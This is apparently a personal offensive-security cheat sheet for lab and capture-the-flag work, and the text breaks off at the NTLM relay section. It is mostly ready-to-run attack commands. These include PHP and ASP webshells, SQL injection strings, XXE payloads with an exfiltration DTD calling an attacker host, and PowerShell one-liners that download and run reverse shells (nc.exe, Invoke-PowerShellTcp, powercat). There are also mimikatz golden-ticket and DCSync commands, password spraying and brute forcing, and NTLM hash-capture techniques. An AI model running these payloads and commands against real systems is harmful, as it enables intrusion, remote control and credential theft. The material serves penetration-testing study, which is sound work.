# My Cheet Sheet
- [My Cheet Sheet](#my-cheet-sheet)
- [SWEEP](#sweep)
- [Port Scan](#port-scan)
  - [rustscan](#rustscan)
  - [nmap](#nmap)
  - [Powershell](#powershell)
- [Recon](#recon)
  - [Autorecon](#autorecon)
  - [SNMP](#snmp)
  - [SMB](#smb)
  - [DNS](#dns)
  - [RPC](#rpc)
  - [LDAP](#ldap)
  - [Web](#web)
    - [App](#app)
    - [subdomain](#subdomain)
    - [dir](#dir)
    - [WordPress](#wordpress)
    - [endpoint](#endpoint)
    - [POST Fuzz](#post-fuzz)
  - [enum4linux](#enum4linux)
- [Initial Access](#initial-access)
  - [Path Traversal](#path-traversal)
    - [id\_sa](#id_sa)
    - [LFI](#lfi)
  - [Webshell](#webshell)
  - [File Upload](#file-upload)
    - [XXE](#xxe)
  - [Reverse Shell](#reverse-shell)
    - [Bypass](#bypass)
  - [SQLi](#sqli)
    - [MSSQL](#mssql)
  - [ExploitDB](#exploitdb)
  - [shellcode](#shellcode)
  - [Webdav](#webdav)
  - [ldap\_shell](#ldap_shell)
  - [hash\_catch](#hash_catch)
  - [Other Bypass](#other-bypass)
- [Phishing](#phishing)
- [Foothold](#foothold)
  - [Linux](#linux-1)
    - [Background](#background)
    - [Interactiveshell](#interactiveshell)
  - [Windows](#windows-1)
    - [SHELL](#shell)
    - [Client Soft](#client-soft)
- [Credential Access](#credential-access)
  - [Brute Force](#brute-force)
  - [hashcrack](#hashcrack)
  - [Windows](#windows-2)
    - [netexec](#netexec)
    - [PsMapexec](#psmapexec)
    - [kerbrute](#kerbrute)
    - [mimikatz](#mimikatz)
    - [DomainPasswordSpray](#domainpasswordspray)
    - [AD](#ad)
- [Lateral Movement](#lateral-movement)
  - [NTLM Relay](#ntlm-relay)
    - [ESC 8](#esc-8)
    - [ESC11](#esc11)
  - [Inveigh](#inveigh)
  - [PsExec](#psexec)
  - [winRM](#winrm)
  - [DCOM](#dcom)
  - [RunasCs](#runascs)
  - [TightVNC](#tightvnc)
  - [Invoke-TheHash](#invoke-thehash)
- [Discovery](#discovery)
  - [Windows](#windows-3)
    - [LOLBIN](#lolbin)
    - [PowerView](#powerview)
    - [winPEAS](#winpeas)
    - [Powerless](#powerless)
    - [token](#token)
    - [Sherlock](#sherlock)
    - [PrivescCheck](#privesccheck)
    - [Snaffler](#snaffler)
    - [LaZagne](#lazagne)
    - [BloodHound](#bloodhound)
    - [findDelegation](#finddelegation)
    - [cmd](#cmd)
  - [Linux](#linux-2)
    - [cmd](#cmd-1)
    - [linpeas](#linpeas)
    - [pspy](#pspy)
  - [Other](#other)
    - [git](#git)
- [Privilege Escalation](#privilege-escalation)
  - [Windows](#windows-4)
    - [PowerUp](#powerup)
    - [SharpUp](#sharpup)
    - [Abuse DACLs](#abuse-dacls)
    - [LOLBIN](#lolbin-1)
    - [token](#token-1)
    - [SePriv](#sepriv)
    - [PrintNightmare](#printnightmare)
    - [HiveNightmare](#hivenightmare)
    - [S4U](#s4u)
    - [ADCS](#adcs)
    - [UAC bypass](#uac-bypass)
    - [Group](#group)
    - [Other Tools](#other-tools)
  - [Linux](#linux-3)
    - [SUGGEST](#suggest)
    - [/etc/passwd](#etcpasswd)
    - [shadow](#shadow)
    - [sudoer](#sudoer)
    - [Kernel Ecpliot](#kernel-ecpliot)
    - [Cron File backup](#cron-file-backup)
- [Transfer](#transfer)
  - [Port Forwading](#port-forwading)
    - [SSH](#ssh)
    - [Chisel](#chisel)
    - [Ligolo-ng](#ligolo-ng)
  - [SMB](#smb-1)
  - [FTP](#ftp)
- [HTTP](#http)
- [Tips](#tips)
  - [list](#list)
  - [Metasploit](#metasploit)
  - [Empire](#empire)
  - [RDP admin](#rdp-admin)
  - [User-Name-List](#user-name-list)
  - [sheet](#sheet)

# SWEEP
```bash
fping -asgq 172.16.5.0/24

#nmap
nmap -sn -v 192.168.50.1-253 -oG ping-sweep.txt
```
# Port Scan
## rustscan
```bash
rustscan -a <IP> --top --ulimit 5000
```
## nmap
```bash
# TCP
# 22,21,25,389,3389,135,139,445,80,443,8080,8888,1443,5985,5986,8000
nmap -sT -n -Pn -v -A
nmap -sT -n -Pn -v --top-ports 1000 -A 192.168.50.1-254 
nmap -sT -n -Pn -v -T4 -p- -A
# UDP
nmap -sU -n -Pn -T4 -v --top-ports 500 

# SMB
# help /usr/share/nmap/scripts
nmap -p 135,139,445 -n -Pn --script smb-protocols,smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-services 
nmap -p 135,139,445 -n -Pn --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec 

# SMTP
nmap -p 25 --script smtp-enum-users,smtp-commands,smtp-ntlm-info
#POP3
nmap -p 110 --script pop3-capabilities,pop3-ntlm-info 

# LDAP
nmap -p 389 -n -Pn --script ldap-rootdse

# vuln
nmap -n -Pn --script vuln 10.10.10.248
```
## Powershell
```powershell
# on powershell
Start-Job {1..8000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.221.151", $_)) "TCP port $_ is open"} 2>$null}
Receive-Job -Id 
Stop-Job -Id 
```

# Recon
## Autorecon
```bash
source /opt/autorecon/bin/activate
autorecon <CIDR>
```

## SNMP
```bash
wget https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/master/snmpbrute.py
python3 snmpbrute.py -t 10.10.11.193

# snmpwalk
snmpwalk -c internal -v2c 10.10.11.193 
```

## SMB
```bash
# smbclient
smbclient -N -L \\\\10.129.144.138
smbclient //192.168.226.248/transfer -U htb.local/user%[HASH] --pw-nt-hash
smbclient -L //192.168.171.175 -U V.Ventz --password='HotelCalifornia194!'

timeout 300
mask ""
recurse ON
prompt OFF
mget *


# smbmap
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

## DNS
```bash
dig @192.168.192.196 matrimony.off any
dig @192.168.192.196 matrimony.off axfr
```

## RPC
```bash
rpcclient -U '' -N 10.10.11.4
rpcclient -U user --password=weasal

enumdomains
enumdomgroups
lsaquery
querydominfo
enumdomusers
```

## LDAP
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
```bash
ldapsearch -x -v -b "DC=hutch,DC=offsec" -H "ldap://192.168.215.122" "(objectclass=*)"
 | grep 'userPrincipalName:' -A 10 -B 40

ldapsearch -x -v -b "DC=hutch,DC=offsec" -D "user@hutch.offsec" -w pass -H "ldap://192.168.215.122" "(ms-MCS-AdmPwd=*)"
```
https://ldapwiki.com/wiki/Wiki.jsp?page=Active%20Directory%20User%20Related%20Searches
https://ldapwiki.com/wiki/Wiki.jsp?page=Active%20Directory%20Group%20Related%20Searches
https://ldapwiki.com/wiki/Wiki.jsp?page=Active%20Directory%20Computer%20Related%20LDAP%20Query

## Web
### App
```bash
# nikto
nikto -p 80 -h http://

# whatweb
whatweb -v http://
```
### subdomain
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http:// -H "Host: FUZZ. " -mc all -fs 111

gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -u http://
```
### dir
```bash
# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -recursion -recursion-depth 2 -e .aspx,.txt,.pdf,.html,.php -u http://
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -ic -e .aspx,.txt,.pdf,.html,.php -u http:// 

# dirsearch
dirsearch -u https://

# gobuster
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -k -x aspx,txt,pdf,html,php -u http://
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -k -x aspx,txt,pdf,html,php -u http://

# Dirb
dirb http://

# wordlist
comm -23 <(sort /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt) <(sort /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt)
```
### WordPress
```bash
wpscan --url http://192.168.198.244 --enumerate u
wpscan --url http://192.168.229.174 --enumerate at -t 150
wpscan --url http://192.168.198.244 --enumerate p --plugins-detection aggressive  --plugins-version-detection  aggressive -t 150
wpscan --url http://192.168.198.244 --enumerate ap --plugins-detection mixed --plugins-version-detection  aggressive -t 150

wpscan --url http://192.168.169.121/wordpress/ -U 'loly' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt
```

### endpoint
```bash
# katana
katana -u http://
```

### POST Fuzz
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=FUZZ' -u http://
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ -request req -u http://
```

## enum4linux
```bash
# Userenum
enum4linux -u user -p pass -U 172.16.7.3 
```

# Initial Access
https://github.com/swisskyrepo/PayloadsAllTheThings
## Path Traversal
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt
```bash
# linux
/etc/passwd

/proc/self/cmdline
/proc/1/cwd
/proc/2/environ

/home/offsec/.ssh/id_rsa
/home/offsec/.ssh/authorized_keys
/home/offsec/.ssh/known_hosts

/etc/nginx/nginx.conf
/etc/nginx/modules-enabled/default.conf
/etc/apache2/sites-enabled/000-default.conf
/opt/apache2/conf/httpd.conf
/opt/apache/conf/httpd.conf
/var/log/apache2/access.log

/etc/vsftpd.conf
/etc/knockd.conf

#Windows
/Windows/system.ini
/Windows/System32/Drivers/etc/hosts
/Users/ana/.ssh/id_rsa
```
### id_sa
```bash
chmod 400 id_key
ssh -i id_key -p 2222

ssh -i root root@localhost -o IdentitiesOnly=yes
```
```bash
ssh-keygen -t rsa
mv id_rsa.pub authorized_keys
chmod 400 id_rsa
```
### LFI
```php
# page=...

php://filter/resource=admin.php
php://filter/convert.base64-encode/resource=admin.php

data://text/plain;base64,<base64>&cmd=ls

# EXEC
/tmp
/var/crash
/dev/shm
```
## Webshell
/usr/share/webshells
```php
<?php echo(system($_GET["cmd"])); ?>
<?php echo(shell_exec($_GET["cmd"])); ?>
<?php echo(exec($_GET["cmd"]));?>

<?php phpinfo();?>
```
Dfunc - php
```bash
git clone https://github.com/teambi0s/dfunc-bypasser
```
asp
```asp
<% eval request('cmd') %>
```
## File Upload
htaccess
```bash
echo "AddType application/x-httpd-php .tak" > .htaccess
```
polyglot
```
exiftool -Comment='<?php echo "START\n"; echo(system($_GET["cmd"])); echo "\nEND"; ?>' unnamed.jpg -o polyglot.php
```
Wordpress <br/>
https://github.com/p0dalirius/Wordpress-webshell-plugin
### XXE
```xml
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
#### DTD
malicious.dtd
```xml:malicious.dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.1/?x=%file;'>">
%eval;
%exfil;
```
payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```

#### SVG Image
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
## Reverse Shell
https://www.revshells.com/
<br/>
https://tex2e.github.io/reverse-shell-generator/index.html
### Bypass
```bash
w'h'o'am'i
w"h"o"am"i
```
#### Linux
```bash
# /
${PATH:0:1}
${PWD:0:1}
# white
${IFS}
$9
# ;
${LS_COLORS:10:1}
```
#### Windows
```powershell
# \
$env:HOMEPATH[0]

```
## SQLi
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection <br/>
https://portswigger.net/web-security/sql-injection/cheat-sheet
```bash
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //

# colum
' ORDER BY 1-- //
' or 1=1 order by 6 #
' UNION SELECT database(), user(), @@version, null, null -- //
' union select 1,group_concat(schema_name),3,4,5,6 FROM information_schema.schemata #
' UNION SELECT null, username, password, description, null FROM users -- //
```
### MSSQL
#### Inject
```
test' union select 1,@@version,3,4,5,6--
test' union select 1,DB_NAME(),3,4,5,6--
test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')--
test' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users--
```
#### impacket-mssqlclient
https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

# help
help

# user enum
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');

# impersonate
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
## impacket
enum_impersonate
exec_as_login sa
## revert
REVERT;

# xp_cmdshell
enable_xp_cmdshell
disable_xp_cmdshell

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# ole automation
DECLARE @objShell INT; DECLARE @output varchar(8000); EXEC @output = sp_OACreate 'wscript.shell', @objShell Output; EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';

# job
sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"

# trustworthy
## role name and member
enum_db
USE [DBname];
SELECT b.name, c.name FROM [DBname].sys.database_role_members a JOIN [DBname].sys.database_principals b ON a.role_principal_id = b.principal_id LEFT JOIN [DBname].sys.database_principals c ON a.member_principal_id = c.principal_id;

# Link Server list
EXEC sp_linkedservers;
## link server
use_link SQL02
use_link localhost

SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;

# NTLM
responder -I tun0 
cd /usr/share/responder/logs

xp_dirtree '\\10.10.14.23\any\thing'

SELECT name FROM master.dbo.sysdatabases;
USE master
exec master.dbo.xp_dirtree '\\10.10.14.23\relay'
EXEC master..xp_subdirs '\\10.10.14.23\anything\'
EXEC master..xp_fileexist '\\10.10.14.23\anything\'

# Enum
## SELECT name FROM master.dbo.sysdatabases;
enum_db
USE [DBname];
SELECT * FROM [DBname].INFORMATION_SCHEMA.TABLES;
```

## ExploitDB
```bash
searchsploit -m 42031
```
## shellcode
https://shell-storm.org/shellcode/index.html
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python 
```
## Webdav
```bash
cadaver http://
```

## ldap_shell
https://github.com/PShlyundin/ldap_shell
```bash
ldap_shell nara-security.com/TRACY.WHITE:zqwj041FGX

TRACY.WHITE# add_user_to_group TRACY.WHITE 'REMOTE ACCESS'
```

## hash_catch
scf, Library-ms, url, lnk <br/>

hashgrab
```bash
wget https://raw.githubusercontent.com/xct/hashgrab/main/hashgrab.py
python3 hashgrab.py MY_IP test
```
ntlm_theft
```bash
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.14.8 --filename ntlms
```

odt
```bash
pip install ezodf
wget https://github.com/rmdavy/badodf/raw/master/badodt.py
python3 badodt.py
```
netexec
```bash
nxc smb 172.16.117.3 -u  -p '' -M slinky -o SERVER=172.16.117.30 NAME=important
```

## Other Bypass
```bash
X-Forwarded-For: 127.0.0.1
```

# Phishing
webdav
```bash
# webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/work/webdav
# sendmail
swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.232.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap  
```
shellter
```bash
shellter
```

# Foothold
## Linux
### Background
```bash
nohup python3  &
```
### Interactiveshell
```bash
# 仮想tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg 
export TERM=xterm
export SHELL=/bin/bash
reset
```
## Windows
### SHELL
```powershell
#nc.exe
cmd.exe /c powershell 

powershell -nop -c "iwr -Uri http://192.168.45.218/nc.exe -Outfile C:\Windows\temp\nc.exe"
C:\Windows\temp\nc.exe 192.168.45.218 4444 -e powershell

# Invoke-PowerShellTcp
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 4444"

# powercat
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.185/powercat.ps1');powercat -c 192.168.45.185 -p 4444 -e powershell"

# Unrestricted
powershell -ep bypass
Set-ExecutionPolicy Bypass -Force -Scope Process
```
### Client Soft
```bash
# SMB
impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
smbclient -U tyler \\\\test\\share
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234

# psexec
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
# wmiexec
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
# dcomexec
impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
impacket-dcomexec -object ShellWindows active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand -no-output
impacket-dcomexec -object ShellBrowserWindow active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand

# evil-winrm
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
# atexec
impacket-atexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e'

## double hop
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\backup', $SecPassword)
get-domainuser -spn -credential $Cred
```


# Credential Access
## Brute Force
```bash
# hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.50.202
hydra -L /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt ftp://192.168.50.202 -f
hydra  -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://192.168.175.47 -t 4

# hydra for HTTP
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt 192.168.172.61 http-get /login -f
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403' -f

# mdusa
sed 's/^/:/' /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt > postgres-defaultpasslist.txt
medusa -C postgres-defaultpasslist.txt -h 192.168.175.47 -M postgres -n 5432 
medusa -h 192.168.168.108 -u postgres -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -M postgres -n 5432
```
## hashcrack
```bash
# MD5-RAW: 0, SHA-256: 1400, NTLM: 1000, NetNTLMv2: 5600, AS-REP: 18200, TGS-REP: 13100, DCC2: 2100
hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --rules /usr/share/john/rules/best64.rule hash.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt --rules /usr/share/john/rules/best64.rule hash
```
## Windows
### netexec
```bash
# Module list
nxc ldap -L
## Nomal
nxc smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success --local-auth --loggedon-users
nxc smb 192.168.226.189 192.168.226.191 192.168.226.248-249 -u user -H 54abdf854d8c0653b1be3458454e4a3b -d htb.local --continue-on-success
nxc smb 10.129.144.138 -u "guest" -p "" --rid-brute --pass-pol
nxc smb 10.129.144.138 -u user_list -p user_list --no-brute

# SMB share
nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --shares
nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --spider serviceaccount --regex .
nxc smb 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --share serviceaccount --get-file flag.txt flag.txt

# pass-pol
nxc smb 10.129.204.177  -u '' -p '' --pass-pol

# GPP
## gpp-decryp cmd
nxc smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_password
nxc smb 192.168.50.75 -u username -p 'Nexus123!' -M gpp_autologin

# asreproast
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --asreproast asreproast2.out
# kerberoasting
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --kerberoasting kerberoasting.out
# Kerberos Unconstrained Delegation
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --trusted-for-delegation
# No password
nxc ldap 10.129.204.177 -u username -p 'Nexus123!' -d inlanefreight.htb --password-not-required

# MSSQL
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv -o ACTION=privesc
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -x 'whoami'
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth --put-file /usr/share/windows-binaries/nc.exe 'C:/Windows/Temp/nc.exe'
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT name FROM master.dbo.sysdatabases"
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT table_name from interns.INFORMATION_SCHEMA.TABLES"
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -q "SELECT * from [dbname].[dbo].table_name"
nxc mssql 172.16.15.15 -u sql -p 'Nexus123!' --local-auth -M mssql_priv -o ACTION=rollback

# sid
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --get-sid
# MS-DS-Machine-Account-Quota
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M maq
# gMSA
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' --gmsa
# laps
nxc ldap dc01.inlanefreight.htb -u username -p 'Nexus123!' -M laps

# secret dump
nxc smb 10.129.204.177 -u username -p 'Nexus123!' --sam
nxc smb 10.129.204.177 -u username -p 'Nexus123!' --ntds --enabled
nxc smb 10.129.204.177 -u username -p 'Nexus123!' --lsa 
nxc smb 10.129.204.177 -u username -p 'Nexus123!' -M lsassy
nxc smb 10.129.204.177 -u username -p 'Nexus123!' -M handlekatz
nxc smb 10.129.204.177 -u username -p 'Nexus123!' -M nanodump
## KeePass
nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M keepass_discover
nxc smb 10.129.105.44 -u username -p 'Nexus123!' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/CreatePass/KeePass.config.xml
cat /tmp/export.xml | grep -i protectinmemory -5

## Vuln
nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M Zerologon
nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M PetitPotam
nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M nopac

## Enable RDP
nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=enable
nxc smb 10.129.203.121 -u username -p 'Nexus123!' -M rdp -o ACTION=disable
```
### PsMapexec
```powershell
wget https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/PsMapExec.ps1')

PsMapExec -Targets All -Domain htb.local -Method SMB -Username user -Hash 9a3121977ee93af56ebd0ef4f527a35e -Command "whoami"
```
### kerbrute
```bash
wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /usr/share/seclists/Usernames/Names/names.txt

kerbrute passwordspray ./userlist Password123! --dc 10.10.10.248 -d active.htb 
```
### mimikatz
```powershell
cd /usr/share/windows-resources/powersploit/Exfiltration/
cd /opt/mimikatz/x64

# PTH
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
#PTT
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
.\mimikatz.exe "privilege::debug" "kerberos::ptt c:\ticket\folder" "exit"

# silver ticket
whoami /user
.\mimikatz.exe "kerberos::golden /domain:htb.local /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:Administrator" "exit"

# golden ticket
whoami /user
.\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /ptt /user:Administrator /domain:htb.local /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:cc36cf7a8514893efccd332446158b1a" "exit"

# lsadump
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /all /domain:htb.local" "exit"
```
### DomainPasswordSpray
```powershell
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/DomainPasswordSpray.ps1')

Invoke-DomainPasswordSpray -Password Winter2022 -ErrorAction SilentlyContinue
```
### AD
#### impacket
```bash
# AS-REP
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/user:pass
impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.txt -format john -outputfile outhash.txt

# kerberoasting
impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile tgs.hash
```
##### DCsync - secretsdump
https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
```bash
impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc
impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm

# SAM
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
# ntds.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY local
```

#### Rubeus
```bash
# Unconstrained Delegate
# Ticket monitoring
.\Rubeus.exe monitor /interval:5 /nowrap
#PTT
## Sacrificial Process 
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe asktgs /ticket:BASE64 /service:cifs/dc01.INLANEFREIGHT.local /ptt 
# TGT renew
.\Rubeus.exe renew /ticket:BASE64 /ptt /nowrap

# Constrained Delegate
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.inlanefreight.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
## HTTP
Enter-PSSession ws01.inlanefreight.local


# PTT
## Sacrificial Process 
.\Rubeus.exe createnetonly /program:powershell.exe /show
## Ticket list 
.\Rubeus.exe triage
## Ticket Extracting
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
.\Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt

# AS-REP
.\Rubeus.exe asreproast /nowrap /dc:

# Kerberoasting
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
# RC4
.\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
```


# Lateral Movement
## NTLM Relay 
https://github.com/topotam/PetitPotam/blob/main/PetitPotam.py
```bash
# Enum target SMB
nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
# Responder
